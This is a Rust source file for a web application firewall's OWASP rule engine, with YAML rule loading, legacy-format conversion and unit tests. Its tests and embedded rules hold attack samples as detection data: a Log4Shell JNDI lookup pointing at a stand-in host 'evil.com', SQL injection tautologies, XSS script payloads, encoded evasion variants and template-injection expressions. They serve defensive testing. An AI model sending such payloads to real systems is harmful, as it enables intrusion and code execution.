//! OWASP Core Rule Set (CRS) — unified engine implementation.
//!
//! Rules are loaded at runtime from the `rules/` directory (YAML files in
//! `custom_rule_v1` format).  If the directory cannot be found, a minimal
//! embedded rule set is used as a fallback.
//!
//! Each rule has a `paranoia` level (1–4).  Only rules with
//! `paranoia <= defense_config.owasp_paranoia` are evaluated.
//! Default paranoia level is 1 (most permissive).
//!
//! Internally delegates to `CustomRulesEngine` for rule storage and evaluation,
//! unifying the OWASP and custom rule pipelines (Phase 4 consolidation).

use std::path::Path;

use serde::Deserialize;
use tracing::{debug, warn};

use waf_common::{DetectionResult, RequestCtx};

use crate::rules::engine::{CustomRulesEngine, Operator};
use crate::rules::formats::custom_rule_yaml;

use super::Check;

// ── Minimal embedded fallback rules (custom_rule_v1 format) ─────────────────

const EMBEDDED_RULES_YAML: &str = r"
kind: custom_rule_v1
id: BUILTIN-911100
name: Method is not allowed by policy
pattern_field: method
operator: not_in
value:
  - GET
  - POST
  - PUT
  - DELETE
  - PATCH
  - HEAD
  - OPTIONS
  - CONNECT
  - TRACE
category: protocol
severity: critical
paranoia: 1
---
kind: custom_rule_v1
id: BUILTIN-920160
name: Request body too large (>10 MB)
pattern_field: content_length
operator: gt
value: 10485760
category: protocol
severity: critical
paranoia: 1
---
kind: custom_rule_v1
id: BUILTIN-944150
name: 'Potential RCE: Log4j / Log4shell JNDI injection'
pattern: '(?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)'
pattern_field: all
category: java-injection
severity: critical
paranoia: 1
";

// ── OWASPCheck ──────────────────────────────────────────────────────────────

/// WAF checker implementing a subset of the OWASP CRS.
///
/// Thin wrapper around `CustomRulesEngine` — loads rules via the unified
/// `custom_rule_v1` YAML parser and evaluates them through the shared engine
/// with paranoia-level filtering.
pub struct OWASPCheck {
    engine: CustomRulesEngine,
    rule_count: usize,
}

impl OWASPCheck {
    /// Create by loading rules from `rules/` relative to the CWD.
    /// Falls back to the minimal embedded rule set if `rules/` is absent
    /// or yields zero rules.
    pub fn new() -> Self {
        let dir = Path::new("rules");
        if dir.is_dir() {
            let loaded = Self::from_directory(dir);
            if loaded.rule_count() > 0 {
                tracing::info!("OWASP CRS: loaded {} rules from rules/", loaded.rule_count());
                return loaded;
            }
            warn!("rules/ exists but yielded 0 rules; using embedded fallback");
        } else {
            debug!("rules/ not found; using embedded OWASP rule fallback");
        }
        Self::from_yaml(EMBEDDED_RULES_YAML)
    }

    /// Load all `.yaml` files from `dir` recursively.
    ///
    /// Tries `custom_rule_v1` format first (multi-doc YAML). Falls back to
    /// legacy `RuleSet` format for old files. Skips `custom/` subdirectory
    /// (loaded separately by `custom_file_loader`).
    pub fn from_directory(dir: &Path) -> Self {
        let engine = CustomRulesEngine::new();
        let mut count = 0;
        Self::walk_directory(dir, &engine, &mut count);
        Self {
            engine,
            rule_count: count,
        }
    }

    fn walk_directory(dir: &Path, engine: &CustomRulesEngine, count: &mut usize) {
        let entries = match std::fs::read_dir(dir) {
            Ok(e) => e,
            Err(err) => {
                warn!("Cannot read rules dir {}: {err}", dir.display());
                return;
            }
        };

        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                // Skip custom/ — loaded separately by custom_file_loader
                if path.file_name().and_then(|n| n.to_str()) == Some("custom") {
                    continue;
                }
                Self::walk_directory(&path, engine, count);
                continue;
            }
            if path.extension().and_then(|e| e.to_str()) != Some("yaml") {
                continue;
            }
            let content = match std::fs::read_to_string(&path) {
                Ok(c) => c,
                Err(e) => {
                    warn!("Failed to read {}: {e}", path.display());
                    continue;
                }
            };
            // Try custom_rule_v1 format first
            match custom_rule_yaml::parse(&content) {
                Ok(rules) if !rules.is_empty() => {
                    let n = rules.len();
                    for rule in rules {
                        engine.add_file_rule(rule);
                    }
                    *count += n;
                    debug!("Loaded {n} rules from {}", path.display());
                    continue;
                }
                Ok(_) => {} // empty result — try legacy format below
                Err(e) => {
                    debug!("custom_rule_v1 parse failed for {}: {e}", path.display());
                }
            }
            // Try legacy RuleSet format (kept for backward compat with remote rule sources)
            #[allow(deprecated)]
            if let Some(rules) = legacy_parse_ruleset(&content) {
                let n = rules.len();
                for rule in rules {
                    engine.add_file_rule(rule);
                }
                *count += n;
                debug!("Loaded {n} legacy rules from {}", path.display());
            }
        }
    }

    /// Create from a YAML string. Supports both `custom_rule_v1` (multi-doc)
    /// and legacy `RuleSet` format (single-doc with `version` + `rules` array).
    pub fn from_yaml(yaml: &str) -> Self {
        let engine = CustomRulesEngine::new();

        // Try custom_rule_v1 first
        if let Ok(rules) = custom_rule_yaml::parse(yaml)
            && !rules.is_empty()
        {
            let count = rules.len();
            for rule in rules {
                engine.add_file_rule(rule);
            }
            return Self {
                engine,
                rule_count: count,
            };
        }

        // Fall back to legacy RuleSet format (kept for backward compat with remote rule sources)
        #[allow(deprecated)]
        if let Some(rules) = legacy_parse_ruleset(yaml) {
            let count = rules.len();
            for rule in rules {
                engine.add_file_rule(rule);
            }
            return Self {
                engine,
                rule_count: count,
            };
        }

        warn!("Failed to parse OWASP rules YAML in any format");
        Self { engine, rule_count: 0 }
    }

    /// Try to load from a single YAML file, falling back to defaults on error.
    pub fn from_file_or_default(path: &Path) -> Self {
        std::fs::read_to_string(path).map_or_else(
            |_| {
                debug!("Using embedded OWASP rules");
                Self::new()
            },
            |content| {
                debug!("Loading OWASP rules from {}", path.display());
                Self::from_yaml(&content)
            },
        )
    }

    pub const fn rule_count(&self) -> usize {
        self.rule_count
    }
}

impl Default for OWASPCheck {
    fn default() -> Self {
        Self::new()
    }
}

impl Check for OWASPCheck {
    fn check(&self, ctx: &RequestCtx) -> Option<DetectionResult> {
        if !ctx.host_config.defense_config.owasp_set {
            return None;
        }
        let paranoia = ctx.host_config.defense_config.owasp_paranoia;
        self.engine.check_owasp(ctx, paranoia)
    }
}

// ── Legacy RuleSet parser ───────────────────────────────────────────────────
// Converts old-format OWASP YAML (version + rules array) into CustomRule
// objects that the unified engine can evaluate. Kept for backward compat
// with existing rule files and test fixtures.

use crate::rules::engine::{Condition, ConditionField, ConditionOp, ConditionValue, CustomRule, RuleAction};
use std::collections::HashMap;

#[deprecated(
    since = "0.1.0",
    note = "Use custom_rule_yaml::parse() — all YAML rules now use custom_rule_v1 format"
)]
#[allow(deprecated)]
#[derive(Debug, Deserialize)]
struct LegacyRuleSet {
    #[allow(dead_code)]
    #[serde(default)]
    version: String,
    #[allow(dead_code)]
    #[serde(default = "default_paranoia_level")]
    paranoia_level: u8,
    rules: Vec<LegacyYamlRule>,
}

const fn default_paranoia_level() -> u8 {
    1
}

#[deprecated(
    since = "0.1.0",
    note = "Use custom_rule_yaml::parse() — all YAML rules now use custom_rule_v1 format"
)]
#[allow(deprecated)]
#[derive(Debug, Deserialize)]
struct LegacyYamlRule {
    id: String,
    name: String,
    #[allow(dead_code)]
    #[serde(default)]
    category: String,
    #[allow(dead_code)]
    #[serde(default)]
    severity: String,
    paranoia: u8,
    field: String,
    operator: String,
    value: LegacyYamlValue,
    #[allow(dead_code)]
    action: String,
}

#[deprecated(
    since = "0.1.0",
    note = "Use custom_rule_yaml::parse() — all YAML rules now use custom_rule_v1 format"
)]
#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum LegacyYamlValue {
    Str(String),
    List(Vec<String>),
    Int(i64),
}

#[deprecated(
    since = "0.1.0",
    note = "Use custom_rule_yaml::parse() — all YAML rules now use custom_rule_v1 format"
)]
#[allow(deprecated)]
fn legacy_parse_ruleset(yaml: &str) -> Option<Vec<CustomRule>> {
    let ruleset: LegacyRuleSet = serde_yaml::from_str(yaml).ok()?;
    let rules: Vec<CustomRule> = ruleset.rules.iter().filter_map(legacy_convert_rule).collect();
    if rules.is_empty() { None } else { Some(rules) }
}

#[deprecated(
    since = "0.1.0",
    note = "Use custom_rule_yaml::parse() — all YAML rules now use custom_rule_v1 format"
)]
#[allow(deprecated)]
fn legacy_convert_rule(r: &LegacyYamlRule) -> Option<CustomRule> {
    // Virtual fields that need Rhai scripts (no ConditionField equivalent)
    if let Some(script) = legacy_virtual_field_script(&r.field, &r.operator, &r.value) {
        return Some(legacy_rule_shell(r, Some(script), Vec::new(), None, None));
    }

    let (conditions, specialised_op, pattern) = match r.operator.as_str() {
        "regex" => {
            let pattern_str = match &r.value {
                LegacyYamlValue::Str(s) => s.clone(),
                _ => return None,
            };
            let re = regex::RegexBuilder::new(&pattern_str)
                .size_limit(1 << 20)
                .build()
                .map_err(|e| warn!("Invalid regex in OWASP rule {}: {e}", r.id))
                .ok()?;
            (Vec::new(), None, Some(re))
        }
        "contains" => {
            let s = match &r.value {
                LegacyYamlValue::Str(s) => s.clone(),
                _ => return None,
            };
            let field = legacy_map_field(&r.field);
            (
                vec![Condition {
                    field,
                    operator: Operator::Contains,
                    value: ConditionValue::Str(s),
                }],
                None,
                None,
            )
        }
        "not_in" => {
            let list = match &r.value {
                LegacyYamlValue::List(l) => l.clone(),
                _ => return None,
            };
            let field = legacy_map_field(&r.field);
            (
                vec![Condition {
                    field,
                    operator: Operator::NotInList,
                    value: ConditionValue::List(list),
                }],
                None,
                None,
            )
        }
        "gt" => {
            let n = match &r.value {
                LegacyYamlValue::Int(n) => *n,
                _ => return None,
            };
            let field = legacy_map_field(&r.field);
            (
                vec![Condition {
                    field,
                    operator: Operator::Gt,
                    value: ConditionValue::Number(n),
                }],
                None,
                None,
            )
        }
        "lt" => {
            let n = match &r.value {
                LegacyYamlValue::Int(n) => *n,
                _ => return None,
            };
            let field = legacy_map_field(&r.field);
            (
                vec![Condition {
                    field,
                    operator: Operator::Lt,
                    value: ConditionValue::Number(n),
                }],
                None,
                None,
            )
        }
        "detect_sqli" | "@detectSQLi" => (Vec::new(), Some(Operator::DetectSqli), None),
        "detect_xss" | "@detectXSS" => (Vec::new(), Some(Operator::DetectXss), None),
        op => {
            debug!("Skipping OWASP rule {} with unsupported operator '{op}'", r.id);
            return None;
        }
    };

    Some(legacy_rule_shell(r, None, conditions, pattern, specialised_op))
}

#[deprecated(
    since = "0.1.0",
    note = "Use custom_rule_yaml::parse() — all YAML rules now use custom_rule_v1 format"
)]
#[allow(deprecated)]
fn legacy_rule_shell(
    r: &LegacyYamlRule,
    script: Option<String>,
    conditions: Vec<Condition>,
    pattern: Option<regex::Regex>,
    specialised_op: Option<Operator>,
) -> CustomRule {
    CustomRule {
        id: r.id.clone(),
        host_code: "*".to_string(),
        name: r.name.clone(),
        priority: 0,
        enabled: true,
        condition_op: ConditionOp::And,
        conditions,
        action: RuleAction::Block,
        action_status: 403,
        action_msg: None,
        script,
        match_tree: None,
        risk_delta: None,
        risk_action: None,
        pattern,
        pattern_field: r.field.clone(),
        category: Some(r.category.clone()),
        severity: Some(r.severity.clone()),
        paranoia: Some(r.paranoia),
        tags: Vec::new(),
        metadata: HashMap::new(),
        reference: None,
        specialised_op,
    }
}

#[deprecated(
    since = "0.1.0",
    note = "Use custom_rule_yaml::parse() — all YAML rules now use custom_rule_v1 format"
)]
#[allow(deprecated)]
fn legacy_virtual_field_script(field: &str, operator: &str, value: &LegacyYamlValue) -> Option<String> {
    let n = match value {
        LegacyYamlValue::Int(n) => *n,
        _ => return None,
    };
    let cmp = match operator {
        "gt" => ">",
        "lt" => "<",
        "gte" | "ge" => ">=",
        "lte" | "le" => "<=",
        "eq" => "==",
        _ => return None,
    };
    match field {
        "path_length" => Some(format!("path.len() {cmp} {n}")),
        "query_arg_count" => {
            // Filter empty segments to match legacy behavior (e.g. "a=1&&b=2" → 2, not 3)
            Some(format!(r#"query.split("&").filter(|s| s.len() > 0).len() {cmp} {n}"#))
        }
        _ => None,
    }
}

#[deprecated(
    since = "0.1.0",
    note = "Use custom_rule_yaml::parse() — all YAML rules now use custom_rule_v1 format"
)]
fn legacy_map_field(field: &str) -> ConditionField {
    match field {
        "path" => ConditionField::Path,
        "query" => ConditionField::Query,
        "method" => ConditionField::Method,
        "content_length" => ConditionField::ContentLength,
        "content_type" | "header_content_type" => ConditionField::ContentType,
        "user_agent" | "header_user_agent" => ConditionField::UserAgent,
        "host" => ConditionField::Host,
        "cookies" | "cookie" => ConditionField::Cookie(None),
        "ip" => ConditionField::Ip,
        "response_body" => ConditionField::ResponseBody,
        "all" | "body" | "headers" => ConditionField::Body,
        other => {
            warn!("unknown legacy field '{}'; falling back to Body", other);
            ConditionField::Body
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use bytes::Bytes;
    use std::collections::HashMap;
    use std::sync::Arc;
    use waf_common::{DefenseConfig, HostConfig};

    fn make_ctx(method: &str, path: &str, content_length: u64) -> RequestCtx {
        let dc = DefenseConfig {
            owasp_set: true,
            ..DefenseConfig::default()
        };
        let host_config = Arc::new(HostConfig {
            code: "test".into(),
            host: "example.com".into(),
            defense_config: dc,
            ..HostConfig::default()
        });
        RequestCtx {
            req_id: "test".into(),
            client_ip: "1.2.3.4".parse().unwrap(),
            client_port: 0,
            method: method.into(),
            host: "example.com".into(),
            port: 80,
            path: path.into(),
            query: String::new(),
            headers: HashMap::new(),
            body_preview: Bytes::new(),
            content_length,
            is_tls: false,
            host_config,
            geo: None,
            tier: waf_common::tier::Tier::CatchAll,
            tier_policy: waf_common::RequestCtx::default_tier_policy(),
            cookies: std::collections::HashMap::new(),
        }
    }

    fn make_ctx_with_query(query: &str) -> RequestCtx {
        let dc = DefenseConfig {
            owasp_set: true,
            ..DefenseConfig::default()
        };
        let host_config = Arc::new(HostConfig {
            code: "test".into(),
            host: "example.com".into(),
            defense_config: dc,
            ..HostConfig::default()
        });
        RequestCtx {
            req_id: "test".into(),
            client_ip: "1.2.3.4".parse().unwrap(),
            client_port: 0,
            method: "GET".into(),
            host: "example.com".into(),
            port: 80,
            path: "/".into(),
            query: query.into(),
            headers: HashMap::new(),
            body_preview: Bytes::new(),
            content_length: 0,
            is_tls: false,
            host_config,
            geo: None,
            tier: waf_common::tier::Tier::CatchAll,
            tier_policy: waf_common::RequestCtx::default_tier_policy(),
            cookies: std::collections::HashMap::new(),
        }
    }

    #[test]
    fn test_invalid_method_blocked() {
        let checker = OWASPCheck::new();
        let ctx = make_ctx("FOOBAR", "/", 0);
        assert!(checker.check(&ctx).is_some(), "FOOBAR method should be blocked");
    }

    #[test]
    fn test_valid_method_allowed() {
        let checker = OWASPCheck::new();
        for method in &["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"] {
            let ctx = make_ctx(method, "/", 0);
            assert!(
                checker.check(&ctx).is_none(),
                "{method} should be allowed by OWASP method check"
            );
        }
    }

    #[test]
    fn test_large_body_blocked() {
        let checker = OWASPCheck::new();
        let ctx = make_ctx("POST", "/upload", 11 * 1024 * 1024); // 11 MB
        assert!(checker.check(&ctx).is_some(), "11MB body should be blocked");
    }

    #[test]
    fn test_log4shell_blocked() {
        let checker = OWASPCheck::new();
        let mut ctx = make_ctx("GET", "/", 0);
        ctx.path = "${jndi:ldap://evil.com/a}".into();
        assert!(checker.check(&ctx).is_some());
    }

    // ── detect_sqli tests ────────────────────────────────────────────────────

    const SQLI_RULE_YAML: &str = r#"
version: "1.0"
rules:
  - id: CRS-942100
    name: SQL Injection Attack Detected via libinjection
    category: sqli
    severity: critical
    paranoia: 1
    field: all
    operator: detect_sqli
    value: ""
    action: block
"#;

    #[test]
    fn detect_sqli_blocks_or_tautology() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        assert_eq!(checker.rule_count(), 1);
        let ctx = make_ctx_with_query("id=1' OR '1'='1");
        let result = checker.check(&ctx);
        assert!(result.is_some(), "Should detect SQL injection tautology");
    }

    #[test]
    fn detect_sqli_blocks_union_select() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let ctx = make_ctx_with_query("id=1 UNION SELECT 1,2,3--");
        assert!(checker.check(&ctx).is_some(), "Should detect UNION SELECT injection");
    }

    #[test]
    fn detect_sqli_allows_clean_input() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let ctx = make_ctx_with_query("name=alice&page=2");
        assert!(checker.check(&ctx).is_none(), "Should allow clean query string");
    }

    #[test]
    fn detect_sqli_checks_body() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let mut ctx = make_ctx("POST", "/login", 0);
        ctx.body_preview = Bytes::from("username=admin&password=1' OR '1'='1");
        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in body");
    }

    #[test]
    fn detect_sqli_checks_headers() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let mut ctx = make_ctx("GET", "/", 0);
        ctx.headers.insert("referer".into(), "http://x/' OR '1'='1".into());
        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in headers");
    }

    // ── detect_xss tests ─────────────────────────────────────────────────────

    const XSS_RULE_YAML: &str = r#"
version: "1.0"
rules:
  - id: CRS-941100
    name: XSS Attack Detected via libinjection
    category: xss
    severity: critical
    paranoia: 1
    field: all
    operator: detect_xss
    value: ""
    action: block
"#;

    #[test]
    fn detect_xss_blocks_script_tag() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        assert_eq!(checker.rule_count(), 1);
        let ctx = make_ctx_with_query("q=<script>alert(1)</script>");
        assert!(checker.check(&ctx).is_some(), "Should detect script tag XSS");
    }

    #[test]
    fn detect_xss_blocks_event_handler() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        let ctx = make_ctx_with_query("q=<img src=x onerror=alert(1)>");
        assert!(checker.check(&ctx).is_some(), "Should detect event handler XSS");
    }

    #[test]
    fn detect_xss_allows_clean_input() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        let ctx = make_ctx_with_query("q=hello+world&page=1");
        assert!(checker.check(&ctx).is_none(), "Should allow clean input");
    }

    #[test]
    fn detect_xss_checks_body() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        let mut ctx = make_ctx("POST", "/comment", 0);
        ctx.body_preview = Bytes::from("text=<script>alert('xss')</script>");
        assert!(checker.check(&ctx).is_some(), "Should detect XSS in body");
    }

    // ── compile_rule operator alias tests ────────────────────────────────────

    #[test]
    fn detect_sqli_modsec_alias_works() {
        let yaml = r#"
version: "1.0"
rules:
  - id: TEST-001
    name: SQLi via ModSec alias
    category: sqli
    severity: critical
    paranoia: 1
    field: query
    operator: "@detectSQLi"
    value: ""
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1, "@detectSQLi alias should compile");
    }

    #[test]
    fn detect_xss_modsec_alias_works() {
        let yaml = r#"
version: "1.0"
rules:
  - id: TEST-002
    name: XSS via ModSec alias
    category: xss
    severity: critical
    paranoia: 1
    field: query
    operator: "@detectXSS"
    value: ""
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1, "@detectXSS alias should compile");
    }

    // ── single-field detection tests ─────────────────────────────────────────

    #[test]
    fn detect_sqli_single_field_query() {
        let yaml = r#"
version: "1.0"
rules:
  - id: TEST-003
    name: SQLi on query field only
    category: sqli
    severity: critical
    paranoia: 1
    field: query
    operator: detect_sqli
    value: ""
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        // Should detect in query
        let ctx = make_ctx_with_query("id=1' OR '1'='1");
        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in query field");
        // Should NOT detect in path when field is query-only
        let mut ctx2 = make_ctx("GET", "/1' OR '1'='1", 0);
        ctx2.query = String::new();
        assert!(checker.check(&ctx2).is_none(), "Should not check path when field=query");
    }

    // ── URL-encoded evasion tests ────────────────────────────────────────────

    #[test]
    fn detect_sqli_url_encoded_evasion() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        // %27 = single quote, %20 = space, %3D = equals
        let ctx = make_ctx_with_query("id=1%27%20OR%20%271%27%3D%271");
        assert!(
            checker.check(&ctx).is_some(),
            "Should detect URL-encoded SQLi after decoding"
        );
    }

    #[test]
    fn detect_xss_url_encoded_evasion() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        // %3Cscript%3E = <script>
        let ctx = make_ctx_with_query("q=%3Cscript%3Ealert(1)%3C/script%3E");
        assert!(
            checker.check(&ctx).is_some(),
            "Should detect URL-encoded XSS after decoding"
        );
    }

    // ── Edge case tests ──────────────────────────────────────────────────────

    #[test]
    fn detect_sqli_empty_input_safe() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let ctx = make_ctx("GET", "/", 0);
        assert!(checker.check(&ctx).is_none(), "Empty input should not trigger SQLi");
    }

    #[test]
    fn detect_xss_empty_input_safe() {
        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
        let ctx = make_ctx("GET", "/", 0);
        assert!(checker.check(&ctx).is_none(), "Empty input should not trigger XSS");
    }

    #[test]
    fn detect_sqli_non_utf8_body() {
        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
        let mut ctx = make_ctx("POST", "/", 0);
        ctx.body_preview = Bytes::from(vec![0xFF, 0xFE, 0x00, 0x80]);
        assert!(
            checker.check(&ctx).is_none(),
            "Random binary data should not trigger SQLi"
        );
    }

    #[test]
    fn ssti_pattern_blocks_template_expressions() {
        let yaml = r#"kind: custom_rule_v1
id: TEST-SSTI-001
name: SSTI test
enabled: true
action: block
pattern: '(?i)(?:\$\{\s*[0-9]+\s*\*\s*[0-9]+\s*\}|\{\{\s*[0-9]+\s*\*\s*[0-9]+\s*\}\}|<%=\s*[0-9]+\s*\*\s*[0-9]+\s*%>|#\{[0-9]+\s*\*\s*[0-9]+\})'
category: ssti
severity: critical
paranoia: 1
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1, "SSTI rule should be loaded");

        // Body check
        let mut ctx = make_ctx("POST", "/api/feedback", 0);
        ctx.body_preview = bytes::Bytes::from("{\"comment\":\"{{7*7}}\"}");
        assert!(checker.check(&ctx).is_some(), "SSTI {{7*7}} in body should block");

        let mut ctx2 = make_ctx("POST", "/api/feedback", 0);
        ctx2.body_preview = bytes::Bytes::from("{\"comment\":\"${7*7}\"}");
        assert!(checker.check(&ctx2).is_some(), "SSTI dollar-brace in body should block");

        // Query check
        let ctx3 = make_ctx_with_query("name=%24%7B7*7%7D");
        assert!(checker.check(&ctx3).is_some(), "SSTI dollar-brace in query should block");
    }

    #[test]
    fn detect_sqli_paranoia_level_filtering() {
        let yaml = r#"
version: "1.0"
rules:
  - id: CRS-942100-PL3
    name: SQLi detection at paranoia level 3
    category: sqli
    severity: critical
    paranoia: 3
    field: all
    operator: detect_sqli
    value: ""
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1);
        // Default paranoia is 1, so PL3 rule should be skipped
        let ctx = make_ctx_with_query("id=1' OR '1'='1");
        assert!(
            checker.check(&ctx).is_none(),
            "PL3 rule should be skipped at default paranoia level 1"
        );
    }
}
